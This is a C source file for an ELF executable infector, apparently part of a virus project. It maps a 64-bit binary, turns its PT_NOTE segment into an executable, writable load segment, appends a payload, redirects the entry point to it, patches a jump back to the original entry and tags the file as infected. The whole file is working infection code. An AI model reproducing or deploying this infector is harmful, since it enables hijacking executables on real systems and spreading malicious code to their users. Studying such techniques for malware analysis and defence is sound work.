#include "infection.h"

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <unistd.h>

t_infection *init_infection(void) {
    t_infection *inf = malloc(sizeof(t_infection));
    if (!inf)
        return NULL;
    inf->fd = -1;
    inf->map = NULL;
    inf->st = malloc(sizeof(struct stat));
    if (!inf->st) {
        free(inf);
        return NULL;
    }
    inf->ehdr = NULL;
    inf->phdr = NULL;
    inf->original_entry = 0;
    inf->new_entry = 0;
    inf->ptnote_index = -1;
    inf->payload_offset = 0;
    return inf;
}

void free_infection(t_infection *inf) {
    if (!inf)
        return;
    if (inf->map && inf->map != MAP_FAILED)
        munmap(inf->map, inf->st ? inf->st->st_size : 0);
    if (inf->fd != -1)
        close(inf->fd);
    free(inf->st);
    free(inf);
}

static int open_and_map_elf(t_infection *inf, const char *file) {
    inf->fd = open(file, O_RDWR);
    if (inf->fd == -1) {
        perror("open failed");
        return -1;
    }
    if (fstat(inf->fd, inf->st) == -1) {
        perror("fstat failed");
        return -1;
    }
    inf->map = mmap(NULL, inf->st->st_size, PROT_READ | PROT_WRITE,
                    MAP_SHARED, inf->fd, 0);

    if (inf->map == MAP_FAILED) {
        perror("mmap failed");
        return -1;
    }

    inf->ehdr = (Elf64_Ehdr *)inf->map;
    Elf64_Ehdr *ehdr = inf->ehdr;
    if (ehdr->e_ident[EI_MAG0] != ELFMAG0 ||
        ehdr->e_ident[EI_MAG1] != ELFMAG1 ||
        ehdr->e_ident[EI_MAG2] != ELFMAG2 ||
        ehdr->e_ident[EI_MAG3] != ELFMAG3 ||
        ehdr->e_ident[EI_CLASS] != ELFCLASS64) {
        fprintf(stderr, "File isn't a 64-bit ELF.\n");
        return -1;
    }

    if (ehdr->e_version == 0x1444) {
        fprintf(stderr, "File already infected.\n");
        return -1;
    }
    return 0;
}

static int find_ptnote_segment(t_infection *inf) {
    Elf64_Ehdr *ehdr = inf->ehdr;
    inf->phdr = (Elf64_Phdr *)(inf->map + ehdr->e_phoff);
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (inf->phdr[i].p_type == PT_NOTE && inf->phdr[i].p_filesz >= 32) {
            inf->ptnote_index = i;
            return 0;
        }
    }

    fprintf(stderr, "No PT_NOTE segment found.\n");
    return -1;
}

static void compute_new_entry_point(t_infection *inf) {
    Elf64_Ehdr *ehdr = inf->ehdr;
    Elf64_Phdr *phdr = inf->phdr;
    uint64_t max_addr = 0;
    for (int i = 0; i < ehdr->e_phnum; i++) {
        if (phdr[i].p_type == PT_LOAD) {
            uint64_t end = phdr[i].p_vaddr + phdr[i].p_memsz;
            if (end > max_addr)
                max_addr = end;
        }
    }
    inf->new_entry = (max_addr + 0xFFF) & ~0xFFF;
    ehdr->e_entry = inf->new_entry;
}

static void adjust_segment_sizes(t_infection *inf, size_t payload_size) {
    int idx = inf->ptnote_index;
    inf->phdr[idx].p_vaddr = inf->new_entry;
    inf->phdr[idx].p_paddr = inf->new_entry;
    inf->phdr[idx].p_filesz = payload_size + 0x100000; // FIXME: fixe virus size segfault
    inf->phdr[idx].p_memsz = payload_size + 0x100000;
    inf->phdr[idx].p_align = 0x1000;
}

static void set_payload_offset(t_infection *inf) {
    int idx = inf->ptnote_index;
    off_t offset = (inf->st->st_size + 0xFFF) & ~0xFFF;
    inf->phdr[idx].p_offset = offset;
    inf->payload_offset = offset;
}

static void patch_jump_instruction(t_infection *inf, unsigned char *payload, size_t payload_size) {
    int jmp_offset = -1;
    for (size_t i = 0; i < payload_size - 4; i++) {
        if (payload[i] == 0xE9 && *(uint32_t *)(payload + i + 1) == 0x11111111) {
            jmp_offset = (int)i;
            break;
        }

    }
    int operand_offset = jmp_offset + 1;
    uint64_t jmp_addr = inf->new_entry + jmp_offset;
    int64_t real_offset = (int64_t)inf->original_entry - (int64_t)(jmp_addr + 5);
    *(uint32_t *)(payload + operand_offset) = real_offset;
}

static void patch_stub_offset(t_infection *inf) {
    for (off_t i = 0; i < inf->st->st_size - 8; i++) {
        uint64_t *ptr = (uint64_t *)(inf->map + i);
        if (*ptr == 0x1111111111111111ULL) {
            *ptr = inf->payload_offset;
            break;
        }
    }
}

static int write_payload(t_infection *inf, const unsigned char *payload, size_t payload_size) {
    if (lseek(inf->fd, inf->payload_offset, SEEK_SET) == -1) {
        perror("lseek failed");
        return -1;
    }
    ssize_t written = write(inf->fd, payload, payload_size);
    if (written != (ssize_t)payload_size) {
        perror("write failed");
        return -1;
    }
    if (ftruncate(inf->fd, inf->payload_offset + payload_size) == -1) {
        perror("ftruncate failed");
        return -1;
    }
    if (fsync(inf->fd) == -1)
        perror("fsync warning (non-critical)");
    return 0;
}

int infect_ptnote(const char *target_filename, unsigned char *payload, size_t payload_size) {
    t_infection *inf = init_infection();
    if (!inf) {
        perror("init_infection failed");
        return 1;
    }

    // 1. Open the ELF file to be injected
    if (open_and_map_elf(inf, target_filename) != 0) {
        free_infection(inf);
        return 1;
    }

    // 2. Save the original entry point, e_entry
    inf->original_entry = inf->ehdr->e_entry;

    // 3. Parse the program header table, looking for a PT_NOTE segment
    if (find_ptnote_segment(inf) != 0) {
        free_infection(inf);
        return 1;
    }
    int idx = inf->ptnote_index;

    // 4. Convert the PT_NOTE segment to a PT_LOAD segment
    inf->phdr[idx].p_type = PT_LOAD;

    // 5. Change the memory protections for this segment to allow executable instructions
    inf->phdr[idx].p_flags = PF_R | PF_X | PF_W;

    // 6. Change the entry point address to an area that will not conflict with the
    //    original program execution.
    compute_new_entry_point(inf);

    // 7. Adjust the size on disk and virtual memory size to account for the size of the
    //    injected code
    adjust_segment_sizes(inf, payload_size);

    // 8. Point the offset of our converted segment to the end of the original binary,
    //    where we will store the new code
    set_payload_offset(inf);

    // 9. Patch the end of the code with instructions to jump to the original entry point
    patch_jump_instruction(inf, payload, payload_size);
    patch_stub_offset(inf);

    // 10. Add our injected code to the end of the file
    if (write_payload(inf, payload, payload_size) != 0) {
        free_infection(inf);
        return 1;
    }

    // 11. Mark the file as infected
    inf->ehdr->e_version = 0x1444;

    printf("Injection successful!\n");
    printf("Original entry: 0x%lx -> New entry: 0x%lx\n",
           (unsigned long)inf->original_entry,
           (unsigned long)inf->ehdr->e_entry);
    printf("Payload size: %zu bytes at offset 0x%lx\n",
           payload_size, (unsigned long)inf->payload_offset);

    int ret = inf->new_entry;
    free_infection(inf);
    return ret;
}
